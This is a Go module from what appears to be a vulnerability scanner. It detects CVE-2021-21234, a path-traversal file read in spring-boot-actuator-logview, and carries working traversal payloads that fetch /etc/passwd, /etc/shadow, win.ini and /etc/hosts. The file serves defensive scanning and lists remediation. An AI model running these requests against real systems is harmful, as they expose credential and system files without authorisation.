package cve

// CVE-2021-21234: spring-boot-actuator-logview Arbitrary File Read (LFI)
// Affects spring-boot-actuator-logview < 0.2.13
// Attack: path traversal via /manage/log/view?filename=../../..&base=../

import (
	"context"
	"fmt"
	"strings"
	"time"

	httpclient "github.com/springhawk/springhawk/internal/http"
	"github.com/springhawk/springhawk/internal/vulns"
	"github.com/springhawk/springhawk/pkg/models"
	"github.com/springhawk/springhawk/pkg/utils"
)

func init() { vulns.RegisterRemote(&LogviewLFI{}) }

type LogviewLFI struct{}

func (m *LogviewLFI) ID() string          { return "CVE-2021-21234" }
func (m *LogviewLFI) Name() string        { return "Logview Arbitrary File Read (LFI)" }
func (m *LogviewLFI) CVSS() float64       { return 7.5 }
func (m *LogviewLFI) Severity() models.Severity { return models.SeverityHigh }
func (m *LogviewLFI) Tags() []string      { return []string{"lfi", "path-traversal", "actuator", "logview"} }
func (m *LogviewLFI) Requirements() vulns.ModuleRequirements { return vulns.ModuleRequirements{} }
func (m *LogviewLFI) Description() string {
	return "spring-boot-actuator-logview allows reading arbitrary files via path traversal in the filename parameter."
}

var lfiCandidates = []struct {
	filename string
	base     string
	os       string
	needle   string
}{
	{"/etc/passwd", "../../../../../../../../../../", "linux", "root:x:"},
	{"/etc/shadow", "../../../../../../../../../../", "linux", "root:"},
	{"/windows/win.ini", "../../../../../../../../../../", "windows", "MAPI"},
	{"/etc/hosts", "../../../../../../../../../../", "linux", "localhost"},
}

func (m *LogviewLFI) Check(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	paths := []string{"manage/log/view", "log/view"}
	for _, p := range paths {
		endpoint := utils.JoinURL(target.BaseURL, p)
		for _, c := range lfiCandidates {
			url := fmt.Sprintf("%s?filename=%s&base=%s", endpoint, c.filename, c.base)
			resp, err := client.Get(ctx, url, nil)
			if err != nil {
				continue
			}
			if resp.StatusCode == 200 && strings.Contains(resp.BodyString, c.needle) {
				f := &models.Finding{
					ID:          fmt.Sprintf("%s-%d", m.ID(), time.Now().UnixNano()),
					Type:        models.FindingTypeVuln,
					Severity:    m.Severity(),
					CVSS:        m.CVSS(),
					CVEIDs:      []string{"CVE-2021-21234"},
					Title:       "Logview: Arbitrary File Read via Path Traversal",
					Description: m.Description(),
					URL:         target.BaseURL,
					Endpoint:    "/" + p,
					Method:      "GET",
					Evidence:    fmt.Sprintf("File %s read successfully. Content snippet: %s", c.filename, truncate(resp.BodyString, 200)),
					Remediation: "Upgrade spring-boot-actuator-logview to 0.2.13+. Restrict access to /manage/log/view.",
					References:  []string{"https://github.com/advisories/GHSA-9phg-6p2q-c93r", "https://nvd.nist.gov/vuln/detail/CVE-2021-21234"},
					Tags:        m.Tags(),
					Timestamp:   time.Now(),
					ModuleID:    m.ID(),
				}
				return []*models.Finding{f}, nil
			}
		}
	}
	return nil, nil
}

func (m *LogviewLFI) Exploit(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	return m.Check(ctx, target, client)
}
